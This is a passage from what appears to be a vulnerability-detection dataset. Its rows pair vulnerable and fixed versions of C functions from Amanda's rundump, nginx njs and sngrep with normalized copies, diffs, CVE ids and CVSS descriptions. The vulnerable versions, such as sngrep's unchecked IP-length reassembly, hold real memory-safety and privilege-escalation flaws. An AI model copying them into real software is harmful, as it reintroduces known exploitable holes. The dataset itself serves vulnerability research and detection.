#ifndef ERRMSG
    char *dump_program;
    int i;
    char *e;
    char *cmdline;
    GPtrArray *array = g_ptr_array_new();
    gchar **strings;
    char  **env;
#endif /* ERRMSG */

    glib_init();

    if (argc > 1 && argv[1] && g_str_equal(argv[1], ""--version"")) {
	printf(""rundump-%s\n"", VERSION);
	return (0);
    }

    /*
     * Configure program for internationalization:
     *   1) Only set the message locale for now.
     *   2) Set textdomain for all amanda related programs to ""amanda""
     *      We don't want to be forced to support dozens of message catalogs.
     */  
    setlocale(LC_MESSAGES, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""rundump"");

    /* Don't die when child closes pipe */
    signal(SIGPIPE, SIG_IGN);

    dbopen(DBG_SUBDIR_CLIENT);
    config_init(CONFIG_INIT_CLIENT|CONFIG_INIT_GLOBAL, NULL);

    if (argc < 3) {
	error(_(""Need at least 3 arguments\n""));
	/*NOTREACHED*/
    }

    dbprintf(_(""version %s\n""), VERSION);

#ifdef ERRMSG							/* { */

    g_fprintf(stderr, ERRMSG);
    dbprintf(""%s: %s"", argv[0], ERRMSG);
    dbclose();
    return 1;

#else								/* } { */

#ifdef WANT_SETUID_CLIENT
    check_running_as(RUNNING_AS_CLIENT_LOGIN | RUNNING_AS_UID_ONLY);
    if (!become_root()) {
	error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/*NOTREACHED*/
    }
#else
    check_running_as(RUNNING_AS_CLIENT_LOGIN);
#endif

    /* skip argv[0] */
    argc--;
    argv++;

    dbprintf(_(""config: %s\n""), argv[0]);
    if (!g_str_equal(argv[0], ""NOCONFIG""))
	dbrename(argv[0], DBG_SUBDIR_CLIENT);
    argc--;
    argv++;

#ifdef XFSDUMP

    if (g_str_equal(argv[0], ""xfsdump"")) {
        dump_program = XFSDUMP;
        validate_xfsdump_options(argc, argv);
    } else /* strcmp(argv[0], ""xfsdump"") != 0 */

#endif

#ifdef VXDUMP

    if (g_str_equal(argv[0], ""vxdump""))
        dump_program = VXDUMP;
    else /* strcmp(argv[0], ""vxdump"") != 0 */

#endif

#ifdef VDUMP

    if (g_str_equal(argv[0], ""vdump""))
	dump_program = VDUMP;
    else /* strcmp(argv[0], ""vdump"") != 0 */

#endif

      {
#if defined(DUMP)
        dump_program = DUMP;
        validate_dump_option(argc, argv);
#else
# if defined(XFSDUMP)
        dump_program = XFSDUMP;
        validate_xfsdump_options(argc, argv);
# else
#  if defined(VXDUMP)
	dump_program = VXDUMP;
#  else
        dump_program = ""dump"";
        validate_dump_option(argc, argv);
#  endif
# endif
#endif
      }


    /*
     * Build the array
     */

    g_ptr_array_add(array, g_strdup(dump_program));

    for (i = 1; argv[i]; i++)
        g_ptr_array_add(array, quote_string(argv[i]));

    g_ptr_array_add(array, NULL);
    strings = (gchar **)g_ptr_array_free(array, FALSE);

    cmdline = g_strjoinv("" "", strings);
    g_strfreev(strings);

    dbprintf(_(""running: %s\n""), cmdline);
    amfree(cmdline);

    env = safe_env();
    //Filter or Discard RSH Environmental variable
    int env_count = 0;
    for (int i = 0; env[i] != NULL; i++){
        env_count++;
    }
    for (int i = 0; i < env_count; i++){
        if (strncmp(env[i], ""RSH="", 4) == 0){
            // Remove RSH
            g_free(env[i]);
            // move array elements one step left - which are after ""RSH""
            for (int j = i; j < env_count; j++){
                env[j] = env[j + 1];
            }
            //decrease the variable count
            env[env_count-1] = NULL;
            break;
        }
    }
    execve(dump_program, argv, env);
    free_env(env);

    e = strerror(errno);
    dbprintf(_(""failed (%s)\n""), e);
    dbclose();

    g_fprintf(stderr, _(""rundump: could not exec %s: %s\n""), dump_program, e);
    return 1;
#endif								/* } */
}","int
main(
    int		VAR_0,
    char **	VAR_1)
{
#ifndef VAR_2
    char *VAR_3;
    int VAR_4;
    char *VAR_5;
    char *VAR_6;
    GPtrArray *VAR_7 = g_ptr_array_new();
    gchar **VAR_8;
    char  **VAR_9;
#endif /* COMMENT_0 */

    glib_init();

    if (VAR_0 > 1 && VAR_1[1] && g_str_equal(VAR_1[1], ""--version"")) {
	printf(""rundump-%s\n"", VAR_10);
	return (0);
    }

    /* COMMENT_1 */
                                                  
                                                
                                                                      
                                                                             
         
    setlocale(VAR_11, ""C"");
    textdomain(""amanda""); 

    safe_fd(-1, 0);
    safe_cd();

    set_pname(""rundump"");

    /* COMMENT_7 */
    signal(VAR_12, VAR_13);

    dbopen(VAR_14);
    config_init(VAR_15|VAR_16, NULL);

    if (VAR_0 < 3) {
	error(_(""Need at least 3 arguments\n""));
	/* COMMENT_8 */
    }

    dbprintf(_(""version %s\n""), VAR_10);

#ifdef VAR_2							/* COMMENT_9 */

    g_fprintf(VAR_17, VAR_2);
    dbprintf(""%s: %s"", VAR_1[0], VAR_2);
    dbclose();
    return 1;

#else								/* COMMENT_10 */

#ifdef VAR_18
    check_running_as(VAR_19 | VAR_20);
    if (!become_root()) {
	error(_(""error [%s could not become root (is the setuid bit set?)]\n""), get_pname());
	/* COMMENT_8 */
    }
#else
    check_running_as(VAR_19);
#endif

    /* COMMENT_11 */
    VAR_0--;
    VAR_1++;

    dbprintf(_(""config: %s\n""), VAR_1[0]);
    if (!g_str_equal(VAR_1[0], ""NOCONFIG""))
	dbrename(VAR_1[0], VAR_14);
    VAR_0--;
    VAR_1++;

#ifdef VAR_21

    if (g_str_equal(VAR_1[0], ""xfsdump"")) {
        VAR_3 = VAR_21;
        validate_xfsdump_options(VAR_0, VAR_1);
    } else /* COMMENT_12 */

#endif

#ifdef VAR_22

    if (g_str_equal(VAR_1[0], ""vxdump""))
        VAR_3 = VAR_22;
    else /* COMMENT_13 */

#endif

#ifdef VAR_23

    if (g_str_equal(VAR_1[0], ""vdump""))
	VAR_3 = VAR_23;
    else /* COMMENT_14 */

#endif

      {
#if defined(VAR_24)
        VAR_3 = VAR_24;
        validate_dump_option(VAR_0, VAR_1);
#else
# if defined(VAR_21)
        VAR_3 = VAR_21;
        validate_xfsdump_options(VAR_0, VAR_1);
# else
#  if defined(VAR_22)
	VAR_3 = VAR_22;
#  else
        VAR_3 = ""dump"";
        validate_dump_option(VAR_0, VAR_1);
#  endif
# endif
#endif
      }


    /* COMMENT_15 */
                      
       

    g_ptr_array_add(VAR_7, g_strdup(VAR_3));

    for (VAR_4 = 1; VAR_1[VAR_4]; VAR_4++)
        g_ptr_array_add(VAR_7, quote_string(VAR_1[VAR_4]));

    g_ptr_array_add(VAR_7, NULL);
    VAR_8 = (gchar **)g_ptr_array_free(VAR_7, FALSE);

    VAR_6 = g_strjoinv("" "", VAR_8);
    g_strfreev(VAR_8);

    dbprintf(_(""running: %s\n""), VAR_6);
    amfree(VAR_6);

    VAR_9 = safe_env();
    /* COMMENT_18 */
    int VAR_25 = 0;
    for (int VAR_4 = 0; VAR_9[VAR_4] != NULL; VAR_4++){
        VAR_25++;
    }
    for (int VAR_4 = 0; VAR_4 < VAR_25; VAR_4++){
        if (strncmp(VAR_9[VAR_4], ""RSH="", 4) == 0){
            /* COMMENT_19 */
            g_free(VAR_9[VAR_4]);
            /* COMMENT_20 */
            for (int VAR_26 = VAR_4; VAR_26 < VAR_25; VAR_26++){
                VAR_9[VAR_26] = VAR_9[VAR_26 + 1];
            }
            /* COMMENT_21 */
            VAR_9[VAR_25-1] = NULL;
            break;
        }
    }
    execve(VAR_3, VAR_1, VAR_9);
    free_env(VAR_9);

    VAR_5 = strerror(VAR_27);
    dbprintf(_(""failed (%s)\n""), VAR_5);
    dbclose();

    g_fprintf(VAR_17, _(""rundump: could not exec %s: %s\n""), VAR_3, VAR_5);
    return 1;
#endif								/* COMMENT_22 */
}",zmanda/amanda/b930189c06290a23aba177687b2f123590323be1/rundump.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -78,9 +78,10 @@
 
 #ifdef XFSDUMP
 
-    if (g_str_equal(argv[0], ""xfsdump""))
+    if (g_str_equal(argv[0], ""xfsdump"")) {
         dump_program = XFSDUMP;
-    else /* strcmp(argv[0], ""xfsdump"") != 0 */
+        validate_xfsdump_options(argc, argv);
+    } else /* strcmp(argv[0], ""xfsdump"") != 0 */
 
 #endif
 
@@ -100,6 +101,7 @@
 
 #endif
 
+      {
 #if defined(DUMP)
         dump_program = DUMP;
         validate_dump_option(argc, argv);
@@ -116,6 +118,7 @@
 #  endif
 # endif
 #endif
+      }
 
 
     /*","{'deleted_lines': ['    if (g_str_equal(argv[0], ""xfsdump""))', '    else /* strcmp(argv[0], ""xfsdump"") != 0 */'], 'added_lines': ['    if (g_str_equal(argv[0], ""xfsdump"")) {', '        validate_xfsdump_options(argc, argv);', '    } else /* strcmp(argv[0], ""xfsdump"") != 0 */', '      {', '      }']}",True,"Amanda 3.5.1 allows privilege escalation from the regular user backup to root. The SUID binary located at /lib/amanda/rundump will execute /usr/sbin/dump as root with controlled arguments from the attacker which may lead to escalation of privileges, denial of service, and information disclosure.",6.7,MEDIUM,1,valid,2023-02-26T21:34:23Z,4
CVE-2023-27729,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,nginx/njs,"Parser: fixed the detection of await in arguments.

This fixes #619 issue on Github.",455f6d4f0447a60329c21928d67f61c79ac3b243,https://github.com/nginx/njs/commit/455f6d4f0447a60329c21928d67f61c79ac3b243,src/njs_parser.c,njs_parser_await,"static njs_int_t
njs_parser_await(njs_parser_t *parser, njs_lexer_token_t *token,
njs_queue_link_t *current)
{
njs_parser_node_t   *node;
njs_parser_scope_t  *scope;
scope = njs_function_scope(parser->scope);
if (!scope->async) {
njs_parser_syntax_error(parser,
""await is only valid in async functions"");
return NJS_ERROR;
}
if (scope->in_args) {
njs_parser_syntax_error(parser, ""await in arguments not supported"");
return NJS_ERROR;
}
node = njs_parser_node_new(parser, NJS_TOKEN_AWAIT);
if (njs_slow_path(node == NULL)) {
return NJS_ERROR;
}
node->token_line = token->line;
njs_lexer_consume_token(parser->lexer, 1);
parser->node = NULL;
njs_parser_next(parser, njs_parser_unary_expression);
return njs_parser_after(parser, current, node, 0,
njs_parser_await_after);
}","static njs_int_t
njs_parser_await(njs_parser_t *VAR_0, njs_lexer_token_t *VAR_1,
njs_queue_link_t *VAR_2)
{
njs_parser_node_t   *VAR_3;
njs_parser_scope_t  *VAR_4;
VAR_4 = njs_function_scope(VAR_0->scope);
if (!VAR_4->async) {
njs_parser_syntax_error(VAR_0,
""await is only valid in async functions"");
return VAR_5;
}
if (VAR_4->in_args) {
njs_parser_syntax_error(VAR_0, ""await in arguments not supported"");
return VAR_5;
}
VAR_3 = njs_parser_node_new(VAR_0, VAR_6);
if (njs_slow_path(VAR_3 == NULL)) {
return VAR_5;
}
VAR_3->token_line = VAR_1->line;
njs_lexer_consume_token(VAR_0->lexer, 1);
VAR_0->node = NULL;
njs_parser_next(VAR_0, VAR_7);
return njs_parser_after(VAR_0, VAR_2, VAR_3, 0,
VAR_8);
}",nginx/njs/455f6d4f0447a60329c21928d67f61c79ac3b243/njs_parser.c/vul/before/0.json,"static njs_int_t
njs_parser_await(njs_parser_t *parser, njs_lexer_token_t *token,
    njs_queue_link_t *current)
{
    njs_parser_node_t   *node;

    if (!njs_function_scope(parser->scope)->async) {
        njs_parser_syntax_error(parser,
                                ""await is only valid in async functions"");
        return NJS_ERROR;
    }

    if (parser->scope->in_args) {
        njs_parser_syntax_error(parser, ""await in arguments not supported"");
        return NJS_ERROR;
    }

    node = njs_parser_node_new(parser, NJS_TOKEN_AWAIT);
    if (njs_slow_path(node == NULL)) {
        return NJS_ERROR;
    }

    node->token_line = token->line;

    njs_lexer_consume_token(parser->lexer, 1);

    parser->node = NULL;

    njs_parser_next(parser, njs_parser_unary_expression);

    return njs_parser_after(parser, current, node, 0,
                            njs_parser_await_after);
}","static njs_int_t
njs_parser_await(njs_parser_t *VAR_0, njs_lexer_token_t *VAR_1,
    njs_queue_link_t *VAR_2)
{
    njs_parser_node_t   *VAR_3;

    if (!njs_function_scope(VAR_0->scope)->async) {
        njs_parser_syntax_error(VAR_0,
                                ""await is only valid in async functions"");
        return VAR_4;
    }

    if (VAR_0->scope->in_args) {
        njs_parser_syntax_error(VAR_0, ""await in arguments not supported"");
        return VAR_4;
    }

    VAR_3 = njs_parser_node_new(VAR_0, VAR_5);
    if (njs_slow_path(VAR_3 == NULL)) {
        return VAR_4;
    }

    VAR_3->token_line = VAR_1->line;

    njs_lexer_consume_token(VAR_0->lexer, 1);

    VAR_0->node = NULL;

    njs_parser_next(VAR_0, VAR_6);

    return njs_parser_after(VAR_0, VAR_2, VAR_3, 0,
                            VAR_7);
}",nginx/njs/455f6d4f0447a60329c21928d67f61c79ac3b243/njs_parser.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -3,17 +3,14 @@
     njs_queue_link_t *current)
 {
     njs_parser_node_t   *node;
-    njs_parser_scope_t  *scope;
 
-    scope = njs_function_scope(parser->scope);
-
-    if (!scope->async) {
+    if (!njs_function_scope(parser->scope)->async) {
         njs_parser_syntax_error(parser,
                                 ""await is only valid in async functions"");
         return NJS_ERROR;
     }
 
-    if (scope->in_args) {
+    if (parser->scope->in_args) {
         njs_parser_syntax_error(parser, ""await in arguments not supported"");
         return NJS_ERROR;
     }","{'deleted_lines': ['    njs_parser_scope_t  *scope;', '    scope = njs_function_scope(parser->scope);', '', '    if (!scope->async) {', '    if (scope->in_args) {'], 'added_lines': ['    if (!njs_function_scope(parser->scope)->async) {', '    if (parser->scope->in_args) {']}",True,Nginx NJS v0.7.10 was discovered to contain an illegal memcpy via the function njs_vmcode_return at src/njs_vmcode.c.,7.5,HIGH,2,valid,2023-02-28T02:39:44Z,4
CVE-2023-31981,['CWE-787'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,irontec/sngrep,capture: properly validate capture length calculated from IP headers #430,038a65883551fdccc0bb86600309bb85d2251f98,https://github.com/irontec/sngrep/commit/038a65883551fdccc0bb86600309bb85d2251f98,src/capture.c,capture_packet_reasm_ip,"packet_t *
capture_packet_reasm_ip(capture_info_t *capinfo, const struct pcap_pkthdr *header, u_char *packet, uint32_t *size, uint32_t *caplen)
{
struct ip *ip4;
#ifdef USE_IPV6
struct ip6_hdr *ip6;
#endif
uint32_t ip_ver;
uint8_t ip_proto;
uint32_t ip_hl = 0;
uint16_t ip_off = 0;
uint16_t ip_len = 0;
uint16_t ip_frag = 0;
uint32_t ip_id = 0;
uint16_t ip_frag_off = 0;
address_t src = { };
address_t dst = { };
vector_iter_t it;
packet_t *pkt;
frame_t *frame;
uint32_t len_data = 0;
uint16_t link_hl = capinfo->link_hl;
#ifdef USE_IPV6
struct ip6_frag *ip6f;
#endif
if (capinfo->link == DLT_EN10MB) {
struct ether_header *eth = (struct ether_header *) packet;
if (ntohs(eth->ether_type) == ETHERTYPE_8021Q) {
link_hl += 4;
}
}
#ifdef SLL_HDR_LEN
if (capinfo->link == DLT_LINUX_SLL) {
struct sll_header *sll = (struct sll_header *) packet;
if (ntohs(sll->sll_protocol) == ETHERTYPE_8021Q) {
link_hl += 4;
}
}
#endif
if (capinfo->link == DLT_NFLOG) {
while (link_hl + 8 <= *caplen) {
nflog_tlv_t *tlv = (nflog_tlv_t *) (packet + link_hl);
if (!tlv) break;
if (tlv->tlv_type == NFULA_PAYLOAD) {
link_hl += 4;
break;
}
if (tlv->tlv_length >= 4) {
link_hl += ((tlv->tlv_length + 3) & ~3); 
}
}
}
while (*size >= sizeof(struct ip)) {
ip4 = (struct ip *) (packet + link_hl);
#ifdef USE_IPV6
ip6 = (struct ip6_hdr *) (packet + link_hl);
#endif
ip_ver = ip4->ip_v;
switch (ip_ver) {
case 4:
ip_hl = ip4->ip_hl * 4;
ip_proto = ip4->ip_p;
ip_off = ntohs(ip4->ip_off);
ip_len = ntohs(ip4->ip_len);
ip_frag = ip_off & (IP_MF | IP_OFFMASK);
ip_frag_off = (ip_frag) ? (ip_off & IP_OFFMASK) * 8 : 0;
ip_id = ntohs(ip4->ip_id);
inet_ntop(AF_INET, &ip4->ip_src, src.ip, sizeof(src.ip));
inet_ntop(AF_INET, &ip4->ip_dst, dst.ip, sizeof(dst.ip));
break;
#ifdef USE_IPV6
case 6:
ip_hl = sizeof(struct ip6_hdr);
ip_proto = ip6->ip6_nxt;
ip_len = ntohs(ip6->ip6_ctlun.ip6_un1.ip6_un1_plen) + ip_hl;
if (ip_proto == IPPROTO_FRAGMENT) {
ip_frag = 1;
ip6f = (struct ip6_frag *) (packet + link_hl + ip_hl);
ip_frag_off = ntohs(ip6f->ip6f_offlg & IP6F_OFF_MASK);
ip_id = ntohl(ip6f->ip6f_ident);
}
inet_ntop(AF_INET6, &ip6->ip6_src, src.ip, sizeof(src.ip));
inet_ntop(AF_INET6, &ip6->ip6_dst, dst.ip, sizeof(dst.ip));
break;
#endif
default:
return NULL;
}
*caplen = link_hl + ip_len;
*size = *caplen - link_hl - ip_hl;
if (ip_proto == IPPROTO_IPIP) {
link_hl += ip_hl;
} else {
break;
}
}
if (ip_frag == 0) {
pkt = packet_create(ip_ver, ip_proto, src, dst, ip_id);
packet_add_frame(pkt, header, packet);
return pkt;
}
it = vector_iterator(capinfo->ip_reasm);
while ((pkt = vector_iterator_next(&it))) {
if (addressport_equals(pkt->src, src)
&& addressport_equals(pkt->dst, dst)
&& pkt->ip_id == ip_id) {
break;
}
}
if (pkt) {
packet_add_frame(pkt, header, packet);
} else {
pkt = packet_create(ip_ver, ip_proto, src, dst, ip_id);
packet_add_frame(pkt, header, packet);
vector_append(capinfo->ip_reasm, pkt);
}
pkt->ip_cap_len += ip_len - ip_hl;
#ifdef USE_IPV6
if (ip_ver == 6 && ip_frag) {
pkt->ip_cap_len -= sizeof(struct ip6_frag);
}
#endif
if (ip_ver == 4 && (ip_off & IP_MF) == 0) {
pkt->ip_exp_len = ip_frag_off + ip_len - ip_hl;
}
#ifdef USE_IPV6
if (ip_ver == 6 && ip_frag && (ip6f->ip6f_offlg & htons(0x01)) == 0) {
pkt->ip_exp_len = ip_frag_off + ip_len - ip_hl - sizeof(struct ip6_frag);
}
#endif
if (pkt->ip_cap_len == pkt->ip_exp_len) {
it = vector_iterator(pkt->frames);
while ((frame = vector_iterator_next(&it))) {
switch (ip_ver) {
case 4: {
struct ip *frame_ip = (struct ip *) (frame->data + link_hl);
len_data += ntohs(frame_ip->ip_len) - frame_ip->ip_hl * 4;
break;
}
#ifdef USE_IPV6
case 6: {
struct ip6_hdr *frame_ip6 = (struct ip6_hdr *) (frame->data + link_hl);
len_data += ntohs(frame_ip6->ip6_ctlun.ip6_un1.ip6_un1_plen);
break;
}
#endif
default:
break;
}
}
if (len_data > MAX_CAPTURE_LEN)
return NULL;
memset(packet, 0, link_hl + ip_hl + len_data);
it = vector_iterator(pkt->frames);
while ((frame = vector_iterator_next(&it))) {
switch (ip_ver) {
case 4: {
struct ip *frame_ip = (struct ip *) (frame->data + link_hl);
memcpy(packet + link_hl + ip_hl + (ntohs(frame_ip->ip_off) & IP_OFFMASK) * 8,
frame->data + link_hl + frame_ip->ip_hl * 4,
ntohs(frame_ip->ip_len) - frame_ip->ip_hl * 4);
}
break;
#ifdef USE_IPV6
case 6: {
struct ip6_hdr *frame_ip6 = (struct ip6_hdr*)(frame->data + link_hl);
struct ip6_frag *frame_ip6f = (struct ip6_frag *)(frame->data + link_hl + ip_hl);
uint16_t frame_ip_frag_off = ntohs(frame_ip6f->ip6f_offlg & IP6F_OFF_MASK);
memcpy(packet + link_hl + ip_hl + sizeof(struct ip6_frag) + frame_ip_frag_off,
frame->data + link_hl + ip_hl + sizeof (struct ip6_frag),
ntohs(frame_ip6->ip6_ctlun.ip6_un1.ip6_un1_plen));
pkt->proto = frame_ip6f->ip6f_nxt;
}
break;
#endif
default:
break;
}
}
*caplen = link_hl + ip_hl + len_data;
#ifdef USE_IPV6
if (ip_ver == 6) {
*caplen += sizeof(struct ip6_frag);
}
#endif
*size = len_data;
vector_remove(capinfo->ip_reasm, pkt);
return pkt;
}
return NULL;
}","packet_t *
capture_packet_reasm_ip(capture_info_t *VAR_0, const struct pcap_pkthdr *VAR_1, u_char *VAR_2, uint32_t *VAR_3, uint32_t *VAR_4)
{
struct ip *VAR_5;
#ifdef VAR_6
struct ip6_hdr *VAR_7;
#endif
uint32_t VAR_8;
uint8_t VAR_9;
uint32_t VAR_10 = 0;
uint16_t VAR_11 = 0;
uint16_t VAR_12 = 0;
uint16_t VAR_13 = 0;
uint32_t VAR_14 = 0;
uint16_t VAR_15 = 0;
address_t VAR_16 = { };
address_t VAR_17 = { };
vector_iter_t VAR_18;
packet_t *VAR_19;
frame_t *VAR_20;
uint32_t VAR_21 = 0;
uint16_t VAR_22 = VAR_0->link_hl;
#ifdef VAR_6
struct ip6_frag *VAR_23;
#endif
if (VAR_0->link == VAR_24) {
struct ether_header *VAR_25 = (struct ether_header *) VAR_2;
if (ntohs(VAR_25->ether_type) == VAR_26) {
VAR_22 += 4;
}
}
#ifdef VAR_27
if (VAR_0->link == VAR_28) {
struct sll_header *VAR_29 = (struct sll_header *) VAR_2;
if (ntohs(VAR_29->sll_protocol) == VAR_26) {
VAR_22 += 4;
}
}
#endif
if (VAR_0->link == VAR_30) {
while (VAR_22 + 8 <= *VAR_4) {
nflog_tlv_t *VAR_31 = (nflog_tlv_t *) (VAR_2 + VAR_22);
if (!VAR_31) break;
if (VAR_31->tlv_type == VAR_32) {
VAR_22 += 4;
break;
}
if (VAR_31->tlv_length >= 4) {
VAR_22 += ((VAR_31->tlv_length + 3) & ~3); 
}
}
}
while (*VAR_3 >= sizeof(struct ip)) {
VAR_5 = (struct ip *) (VAR_2 + VAR_22);
#ifdef VAR_6
VAR_7 = (struct ip6_hdr *) (VAR_2 + VAR_22);
#endif
VAR_8 = VAR_5->ip_v;
switch (VAR_8) {
case 4:
VAR_10 = VAR_5->ip_hl * 4;
VAR_9 = VAR_5->ip_p;
VAR_11 = ntohs(VAR_5->ip_off);
VAR_12 = ntohs(VAR_5->ip_len);
VAR_13 = VAR_11 & (VAR_33 | VAR_34);
VAR_15 = (VAR_13) ? (VAR_11 & VAR_34) * 8 : 0;
VAR_14 = ntohs(VAR_5->ip_id);
inet_ntop(VAR_35, &VAR_5->ip_src, VAR_16.ip, sizeof(VAR_16.ip));
inet_ntop(VAR_35, &VAR_5->ip_dst, VAR_17.ip, sizeof(VAR_17.ip));
break;
#ifdef VAR_6
case 6:
VAR_10 = sizeof(struct ip6_hdr);
VAR_9 = VAR_7->ip6_nxt;
VAR_12 = ntohs(VAR_7->ip6_ctlun.ip6_un1.ip6_un1_plen) + VAR_10;
if (VAR_9 == VAR_36) {
VAR_13 = 1;
VAR_23 = (struct ip6_frag *) (VAR_2 + VAR_22 + VAR_10);
VAR_15 = ntohs(VAR_23->ip6f_offlg & VAR_37);
VAR_14 = ntohl(VAR_23->ip6f_ident);
}
inet_ntop(VAR_38, &VAR_7->ip6_src, VAR_16.ip, sizeof(VAR_16.ip));
inet_ntop(VAR_38, &VAR_7->ip6_dst, VAR_17.ip, sizeof(VAR_17.ip));
break;
#endif
default:
return NULL;
}
*VAR_4 = VAR_22 + VAR_12;
*VAR_3 = *VAR_4 - VAR_22 - VAR_10;
if (VAR_9 == VAR_39) {
VAR_22 += VAR_10;
} else {
break;
}
}
if (VAR_13 == 0) {
VAR_19 = packet_create(VAR_8, VAR_9, VAR_16, VAR_17, VAR_14);
packet_add_frame(VAR_19, VAR_1, VAR_2);
return VAR_19;
}
VAR_18 = vector_iterator(VAR_0->ip_reasm);
while ((VAR_19 = vector_iterator_next(&VAR_18))) {
if (addressport_equals(VAR_19->src, VAR_16)
&& addressport_equals(VAR_19->dst, VAR_17)
&& VAR_19->ip_id == VAR_14) {
break;
}
}
if (VAR_19) {
packet_add_frame(VAR_19, VAR_1, VAR_2);
} else {
VAR_19 = packet_create(VAR_8, VAR_9, VAR_16, VAR_17, VAR_14);
packet_add_frame(VAR_19, VAR_1, VAR_2);
vector_append(VAR_0->ip_reasm, VAR_19);
}
VAR_19->ip_cap_len += VAR_12 - VAR_10;
#ifdef VAR_6
if (VAR_8 == 6 && VAR_13) {
VAR_19->ip_cap_len -= sizeof(struct ip6_frag);
}
#endif
if (VAR_8 == 4 && (VAR_11 & VAR_33) == 0) {
VAR_19->ip_exp_len = VAR_15 + VAR_12 - VAR_10;
}
#ifdef VAR_6
if (VAR_8 == 6 && VAR_13 && (VAR_23->ip6f_offlg & htons(0x01)) == 0) {
VAR_19->ip_exp_len = VAR_15 + VAR_12 - VAR_10 - sizeof(struct ip6_frag);
}
#endif
if (VAR_19->ip_cap_len == VAR_19->ip_exp_len) {
VAR_18 = vector_iterator(VAR_19->frames);
while ((VAR_20 = vector_iterator_next(&VAR_18))) {
switch (VAR_8) {
case 4: {
struct ip *VAR_40 = (struct ip *) (VAR_20->data + VAR_22);
VAR_21 += ntohs(VAR_40->ip_len) - VAR_40->ip_hl * 4;
break;
}
#ifdef VAR_6
case 6: {
struct ip6_hdr *VAR_41 = (struct ip6_hdr *) (VAR_20->data + VAR_22);
VAR_21 += ntohs(VAR_41->ip6_ctlun.ip6_un1.ip6_un1_plen);
break;
}
#endif
default:
break;
}
}
if (VAR_21 > VAR_42)
return NULL;
memset(VAR_2, 0, VAR_22 + VAR_10 + VAR_21);
VAR_18 = vector_iterator(VAR_19->frames);
while ((VAR_20 = vector_iterator_next(&VAR_18))) {
switch (VAR_8) {
case 4: {
struct ip *VAR_40 = (struct ip *) (VAR_20->data + VAR_22);
memcpy(VAR_2 + VAR_22 + VAR_10 + (ntohs(VAR_40->ip_off) & VAR_34) * 8,
VAR_20->data + VAR_22 + VAR_40->ip_hl * 4,
ntohs(VAR_40->ip_len) - VAR_40->ip_hl * 4);
}
break;
#ifdef VAR_6
case 6: {
struct ip6_hdr *VAR_41 = (struct ip6_hdr*)(VAR_20->data + VAR_22);
struct ip6_frag *VAR_43 = (struct ip6_frag *)(VAR_20->data + VAR_22 + VAR_10);
uint16_t VAR_44 = ntohs(VAR_43->ip6f_offlg & VAR_37);
memcpy(VAR_2 + VAR_22 + VAR_10 + sizeof(struct ip6_frag) + VAR_44,
VAR_20->data + VAR_22 + VAR_10 + sizeof (struct ip6_frag),
ntohs(VAR_41->ip6_ctlun.ip6_un1.ip6_un1_plen));
VAR_19->proto = VAR_43->ip6f_nxt;
}
break;
#endif
default:
break;
}
}
*VAR_4 = VAR_22 + VAR_10 + VAR_21;
#ifdef VAR_6
if (VAR_8 == 6) {
*VAR_4 += sizeof(struct ip6_frag);
}
#endif
*VAR_3 = VAR_21;
vector_remove(VAR_0->ip_reasm, VAR_19);
return VAR_19;
}
return NULL;
}",irontec/sngrep/038a65883551fdccc0bb86600309bb85d2251f98/capture.c/vul/before/0.json,"packet_t *
capture_packet_reasm_ip(capture_info_t *capinfo, const struct pcap_pkthdr *header, u_char *packet, uint32_t *size, uint32_t *caplen)
{
    // IP header data
    struct ip *ip4;
#ifdef USE_IPV6
    // IPv6 header data
    struct ip6_hdr *ip6;
#endif
    // IP version
    uint32_t ip_ver;
    // IP protocol
    uint8_t ip_proto;
    // IP header size
    uint32_t ip_hl = 0;
    // Fragment offset
    uint16_t ip_off = 0;
    // IP content len
    uint16_t ip_len = 0;
    // Fragmentation flag
    uint16_t ip_frag = 0;
    // Fragmentation identifier
    uint32_t ip_id = 0;
    // Fragmentation offset
    uint16_t ip_frag_off = 0;
    //! Source Address
    address_t src = { };
    //! Destination Address
    address_t dst = { };
    //! Common interator for vectors
    vector_iter_t it;
    //! Packet containers
    packet_t *pkt;
    //! Storage for IP frame
    frame_t *frame;
    uint32_t len_data = 0;
    //! Link + Extra header size
    uint16_t link_hl = capinfo->link_hl;
#ifdef USE_IPV6
    struct ip6_frag *ip6f;
#endif

    // Skip VLAN header if present
    if (capinfo->link == DLT_EN10MB) {
        struct ether_header *eth = (struct ether_header *) packet;
        if (ntohs(eth->ether_type) == ETHERTYPE_8021Q) {
            link_hl += 4;
        }
    }

#ifdef SLL_HDR_LEN
    if (capinfo->link == DLT_LINUX_SLL) {
        struct sll_header *sll = (struct sll_header *) packet;
        if (ntohs(sll->sll_protocol) == ETHERTYPE_8021Q) {
            link_hl += 4;
        }
    }
#endif

    // Skip NFLOG header if present
    if (capinfo->link == DLT_NFLOG) {
        // Parse NFLOG TLV headers
        while (link_hl + 8 <= *caplen) {
            nflog_tlv_t *tlv = (nflog_tlv_t *) (packet + link_hl);

            if (!tlv) break;

            if (tlv->tlv_type == NFULA_PAYLOAD) {
                link_hl += 4;
                break;
            }

            if (tlv->tlv_length >= 4) {
                link_hl += ((tlv->tlv_length + 3) & ~3); /* next TLV aligned to 4B */
            }
        }
    }

    while (*size >= sizeof(struct ip)) {
        // Get IP header
        ip4 = (struct ip *) (packet + link_hl);

#ifdef USE_IPV6
        // Get IPv6 header
        ip6 = (struct ip6_hdr *) (packet + link_hl);
#endif

        // Get IP version
        ip_ver = ip4->ip_v;

        switch (ip_ver) {
            case 4:
                ip_hl = ip4->ip_hl * 4;
                ip_proto = ip4->ip_p;
                ip_off = ntohs(ip4->ip_off);
                ip_len = ntohs(ip4->ip_len);

                ip_frag = ip_off & (IP_MF | IP_OFFMASK);
                ip_frag_off = (ip_frag) ? (ip_off & IP_OFFMASK) * 8 : 0;
                ip_id = ntohs(ip4->ip_id);

                inet_ntop(AF_INET, &ip4->ip_src, src.ip, sizeof(src.ip));
                inet_ntop(AF_INET, &ip4->ip_dst, dst.ip, sizeof(dst.ip));
                break;
#ifdef USE_IPV6
            case 6:
                ip_hl = sizeof(struct ip6_hdr);
                ip_proto = ip6->ip6_nxt;
                ip_len = ntohs(ip6->ip6_ctlun.ip6_un1.ip6_un1_plen) + ip_hl;

